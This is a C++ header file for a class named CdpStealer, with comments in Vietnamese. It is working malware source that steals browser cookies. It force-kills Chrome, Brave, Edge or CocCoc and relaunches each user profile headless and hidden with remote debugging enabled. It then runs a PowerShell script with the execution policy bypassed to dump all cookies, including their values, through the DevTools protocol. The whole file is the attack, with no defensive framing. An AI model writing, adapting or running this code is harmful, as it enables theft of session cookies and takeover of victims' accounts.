#pragma once
#include <windows.h>
#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <fstream>
#include <sstream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <nlohmann/json.hpp>
#include <shlobj.h>
#include <filesystem> // Cần thư viện này để check folder

#pragma comment(lib, "ws2_32.lib")

using json = nlohmann::json;
namespace fs = std::filesystem;

class CdpStealer
{
private:
    static std::string HttpGet(const std::string &host, int port, const std::string &path)
    {
        std::string result = "";
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET)
            return "";

        sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(port);
        inet_pton(AF_INET, host.c_str(), &server.sin_addr);

        DWORD timeout = 2000;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout));

        if (connect(sock, (sockaddr *)&server, sizeof(server)) < 0)
        {
            closesocket(sock);
            return "";
        }

        std::string req = "GET " + path + " HTTP/1.1\r\nHost: " + host + ":" + std::to_string(port) + "\r\nConnection: close\r\n\r\n";
        send(sock, req.c_str(), req.length(), 0);

        char buffer[4096];
        int len;
        while ((len = recv(sock, buffer, 4095, 0)) > 0)
        {
            buffer[len] = 0;
            result += buffer;
        }
        closesocket(sock);

        size_t bodyPos = result.find("\r\n\r\n");
        if (bodyPos != std::string::npos)
            return result.substr(bodyPos + 4);
        return result;
    }

    static bool FileExists(const std::string &path)
    {
        return GetFileAttributesA(path.c_str()) != INVALID_FILE_ATTRIBUTES;
    }

public:
    static json StealCookiesViaCDP(const std::string &browserName)
    {
        std::string exePath = "";
        std::string userDataDir = "";

        // 1. TÌM ĐƯỜNG DẪN
        char *localAppData = nullptr;
        char *programFiles = nullptr;
        char *programFilesX86 = nullptr;
        size_t len = 0;

        _dupenv_s(&localAppData, &len, "LOCALAPPDATA");
        _dupenv_s(&programFiles, &len, "ProgramFiles");
        _dupenv_s(&programFilesX86, &len, "ProgramFiles(x86)");

        std::string appDataPath = localAppData ? localAppData : "";
        std::string progPath = programFiles ? programFiles : "";
        std::string progX86Path = programFilesX86 ? programFilesX86 : "";

        free(localAppData);
        free(programFiles);
        free(programFilesX86);

        if (browserName == "brave")
        {
            userDataDir = appDataPath + "\\BraveSoftware\\Brave-Browser\\User Data";
            std::vector<std::string> candidates = {
                progPath + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                progX86Path + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                appDataPath + "\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"};
            for (const auto &p : candidates)
                if (FileExists(p))
                {
                    exePath = p;
                    break;
                }
        }
        else if (browserName == "chrome")
        {
            userDataDir = appDataPath + "\\Google\\Chrome\\User Data";
            std::vector<std::string> candidates = {
                progPath + "\\Google\\Chrome\\Application\\chrome.exe",
                progX86Path + "\\Google\\Chrome\\Application\\chrome.exe",
                appDataPath + "\\Google\\Chrome\\Application\\chrome.exe"};
            for (const auto &p : candidates)
                if (FileExists(p))
                {
                    exePath = p;
                    break;
                }
        }
        else if (browserName == "coccoc")
        {
            userDataDir = appDataPath + "\\CocCoc\\Browser\\User Data";
            std::vector<std::string> candidates = {
                progPath + "\\CocCoc\\Browser\\Application\\browser.exe",
                progX86Path + "\\CocCoc\\Browser\\Application\\browser.exe",
                appDataPath + "\\CocCoc\\Browser\\Application\\browser.exe"};
            for (const auto &p : candidates)
                if (FileExists(p))
                {
                    exePath = p;
                    break;
                }
        }
        else if (browserName == "edge")
        {
            userDataDir = appDataPath + "\\Microsoft\\Edge\\User Data";
            std::vector<std::string> candidates = {
                progPath + "\\Microsoft\\Edge\\Application\\msedge.exe",
                progX86Path + "\\Microsoft\\Edge\\Application\\msedge.exe"};
            for (const auto &p : candidates)
                if (FileExists(p))
                {
                    exePath = p;
                    break;
                }
        }
        else
            return {{"status", "error"}, {"message", "Unsupported browser type"}};

        if (exePath.empty())
        {
            return {{"status", "error"}, {"message", "Browser executable not found."}};
        }

        // 2. XÁC ĐỊNH CÁC PROFILE CẦN QUÉT
        std::vector<std::string> profilesToScan;

        // Luôn luôn thêm Default
        if (fs::exists(userDataDir + "\\Default"))
            profilesToScan.push_back("Default");

        // Kiểm tra Profile 1 -> Profile 10 (Thường người dùng không tạo quá 10 profile)
        for (int i = 1; i <= 10; i++)
        {
            std::string pName = "Profile " + std::to_string(i);
            if (fs::exists(userDataDir + "\\" + pName))
            {
                profilesToScan.push_back(pName);
            }
        }

        // Nếu không tìm thấy profile nào theo chuẩn, cứ thử Default
        if (profilesToScan.empty())
            profilesToScan.push_back("Default");

        std::string exeName = browserName + ".exe";
        if (browserName == "coccoc")
            exeName = "browser.exe";
        else if (browserName == "edge")
            exeName = "msedge.exe";

        json finalCookies = json::array(); // Mảng chứa tổng cookie

        // ============================================================
        // 3. VÒNG LẶP QUÉT TỪNG PROFILE
        // ============================================================
        for (const auto &profile : profilesToScan)
        {
            std::cout << "[CDP] Scanning Profile: " << profile << "...\n";

            // A. Kill tiến trình cũ để mở khóa profile
            std::string killCmd = "taskkill /F /IM " + exeName + " >nul 2>&1";
            std::system(killCmd.c_str());
            Sleep(500);

            // B. Khởi động Browser ở chế độ HEADLESS (hoàn toàn ẩn)
            std::string cmd = "\"" + exePath + "\" --headless --disable-gpu --remote-debugging-port=9222 --user-data-dir=\"" + userDataDir + "\" --profile-directory=\"" + profile + "\" --no-first-run --password-store=basic --disable-fre --no-default-browser-check --disable-features=RendererCodeIntegrity --disable-extensions";

            STARTUPINFOA si = {sizeof(si)};
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;

            PROCESS_INFORMATION pi;
            if (!CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
            {
                continue; // Lỗi profile này thì bỏ qua
            }

            // C. Kết nối WebSocket (Headless mode khởi động nhanh hơn)
            std::string wsUrl = "";
            for (int i = 0; i < 5; i++)
            { // Thử 5 lần (2.5s max)
                Sleep(500);
                std::string jsonList = HttpGet("127.0.0.1", 9222, "/json");
                if (!jsonList.empty())
                {
                    try
                    {
                        auto j = json::parse(jsonList);
                        if (j.is_array() && j.size() > 0)
                        {
                            for (const auto &tab : j)
                            {
                                if (tab.contains("webSocketDebuggerUrl"))
                                {
                                    wsUrl = tab["webSocketDebuggerUrl"];
                                    break;
                                }
                            }
                            if (!wsUrl.empty())
                                break;
                        }
                    }
                    catch (...)
                    {
                    }
                }
            }

            if (wsUrl.empty())
            {
                ::TerminateProcess(pi.hProcess, 0);
                ::CloseHandle(pi.hProcess);
                ::CloseHandle(pi.hThread);
                continue; // Timeout, thử profile kế tiếp
            }

            // Fix URL
            if (wsUrl.find("ws://127.0.0.1/") != std::string::npos && wsUrl.find(":9222") == std::string::npos)
            {
                wsUrl.replace(0, 16, "ws://127.0.0.1:9222/");
            }

            // D. PowerShell Script lấy Cookie
            std::string psScript = "try {\n";
            psScript += "$ws = New-Object System.Net.WebSockets.ClientWebSocket\n";
            psScript += "$cts = New-Object System.Threading.CancellationTokenSource\n";
            psScript += "$url = new-object System.Uri('" + wsUrl + "')\n";
            psScript += "$ws.ConnectAsync($url, $cts.Token).Wait()\n";

            psScript += "$cmd = '{\"id\": 1, \"method\": \"Network.getAllCookies\"}'\n";
            psScript += "$buffer = [System.Text.Encoding]::UTF8.GetBytes($cmd)\n";
            psScript += "$segment = New-Object System.ArraySegment[byte](, $buffer)\n";
            psScript += "$ws.SendAsync($segment, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $cts.Token).Wait()\n";

            psScript += "$rcvBuffer = New-Object byte[] 5242880\n";
            psScript += "$rcvSegment = New-Object System.ArraySegment[byte](, $rcvBuffer)\n";
            psScript += "$ms = New-Object System.IO.MemoryStream\n";

            psScript += "do {\n";
            psScript += "    $result = $ws.ReceiveAsync($rcvSegment, $cts.Token)\n";
            psScript += "    $result.Wait()\n";
            psScript += "    $ms.Write($rcvBuffer, 0, $result.Result.Count)\n";
            psScript += "} while (-not $result.Result.EndOfMessage)\n";

            psScript += "$str = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())\n";
            psScript += "[System.IO.File]::WriteAllText('cdp_res.txt', $str)\n";
            psScript += "$ms.Dispose()\n";
            psScript += "} catch { [System.IO.File]::WriteAllText('cdp_res.txt', \"PS_ERROR: \" + $_.Exception.Message) }\n";

            std::string psFile = "cdp_dump.ps1";
            std::ofstream out(psFile);
            out << psScript;
            out.close();

            std::system("powershell -ExecutionPolicy Bypass -File cdp_dump.ps1");

            std::ifstream resFile("cdp_res.txt");
            std::stringstream buffer;
            buffer << resFile.rdbuf();
            std::string finalJson = buffer.str();
            resFile.close();

            std::remove(psFile.c_str());
            std::remove("cdp_res.txt");

            // Dọn dẹp tiến trình sau khi xong profile này
            ::TerminateProcess(pi.hProcess, 0);
            ::CloseHandle(pi.hProcess);
            ::CloseHandle(pi.hThread);

            // E. Parse và Gộp Cookie
            try
            {
                size_t jsonStart = finalJson.find("{\"id\":1");
                if (jsonStart != std::string::npos)
                {
                    auto raw = json::parse(finalJson.substr(jsonStart));
                    if (raw.contains("result") && raw["result"].contains("cookies"))
                    {
                        for (const auto &c : raw["result"]["cookies"])
                        {
                            double expiry = -1;
                            if (c.contains("expires"))
                                expiry = c["expires"];

                            // Thêm vào danh sách tổng
                            finalCookies.push_back({
                                {"domain", c["domain"]}, {"name", c["name"]}, {"value", c["value"]}, {"path", c["path"]}, {"secure", c["secure"]}, {"expirationDate", expiry}, {"profile", profile} // Đánh dấu cookie này thuộc profile nào
                            });
                        }
                    }
                }
            }
            catch (...)
            {
            }
        }
        // ============================================================

        if (finalCookies.empty())
            return {{"status", "error"}, {"message", "No cookies found in any profile"}};

        std::cout << "[CDP] Success! Total extracted: " << finalCookies.size() << "\n";

        return {
            {"status", "success"},
            {"browser", browserName},
            {"data", finalCookies}};
    }
};